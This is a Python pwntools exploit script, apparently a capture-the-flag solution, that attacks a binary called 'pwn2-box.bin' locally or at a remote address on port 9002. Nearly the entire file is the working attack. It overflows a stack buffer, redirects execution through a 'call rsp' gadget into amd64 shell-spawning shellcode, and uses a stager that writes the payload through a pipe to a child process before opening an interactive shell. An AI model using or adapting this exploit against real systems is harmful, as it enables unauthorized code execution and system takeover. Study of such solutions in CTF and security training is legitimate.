import sys
import time

#!coding: iso-8859-15

from pwn import *

from IPython import embed
from struct import pack,unpack
from binascii import hexlify
import codecs

# Used for delaying after a send vs. a read
def delay(name):
    if name != "":
        print("[+] Stage: '%s'" % name)
    time.sleep(0.8) # There MUST be a delay due to setvbuf in read()

def print_in_hex(str_):
    if type(str_) is unicode:
        for b in str_:
            print hexlify(b.encode('latin-1')),
    else:
        for b in str_:
            print hexlify(b),
    print("")

stager = """
    jmp short label1
pop_addr:
    pop rsi
    xor rax, rax
    mov al, 1
    xor rdi, rdi
    mov dil, 4
    xor rdx, rdx
    mov rdx, {}
    syscall
    jmp $
label1:
    call pop_addr
    """

def main(args):
    p = None
    debug = False
    if len(args) == 2 and args[1] == "remote":
        p = remote("35.170.14.27", 9002)
    elif len(args) == 2 and args[1] == "debug":
        p = pwnlib.gdb.debug("./pwn2-box-patched.bin",
                """
                break *0x400E10
                break *0x400bcd
                break *0x400ca3
                break *0x400d31
                break *0x400E21
                display /5i $pc
                continue
                """)
    elif len(args) == 3 and args[1] == "debug" and args[2] == "child":
        p = pwnlib.gdb.debug("./pwn2-box-patched.bin",
                """
                break *0x400C36
                break *0x400b9c
                break *0x400AB1
                break *0x400AE6
                display /5i $pc
                set follow-fork-mode child
                continue
                """)
    else:
        p = process("./pwn2-box.bin")

    with context.local(endian='little', arch="amd64", os="linux"):
        context.arch = 'amd64'
        stack_overwrite_len = 0x70 + 8 + 8#8 for rbp and +8 for return address, 0x70 because variable is at +0x70 from rbp
        get_shell=asm(pwnlib.shellcraft.amd64.linux.sh())
        print("len of payload shellcode {}".format(len(get_shell)))
        print_in_hex(get_shell)
        # 0xA and size of content going to put on stack
        stack_content = pack('<c','a')*(stack_overwrite_len - 8)
        stack_content += p64(0x400f7b)# return address of gadged call rsp
        stack_content += get_shell #code to get a shell
        pipe_write = pack('<bI',10, len(stack_content))
        pipe_write += stack_content
        print("length of pipe write {}".format(hex(len(pipe_write))))
        print("content going to be written from parent to child, through pipe")
        print_in_hex(pipe_write)
        full_code = asm(stager.format(len(pipe_write)))# put the size of content passed through size
        print("len of stager shellcode {}".format(len(full_code)))
        print_in_hex(full_code)
        #start sending, first size of the content together
        p.send(pack("<L", len(full_code) + len(pipe_write)))
        # send stager code
        p.send(full_code)
        # send payload
        p.send(pipe_write)
        p.interactive()

    print p.recvall()
    sys.exit(0)

if __name__ == "__main__":
    main(sys.argv)
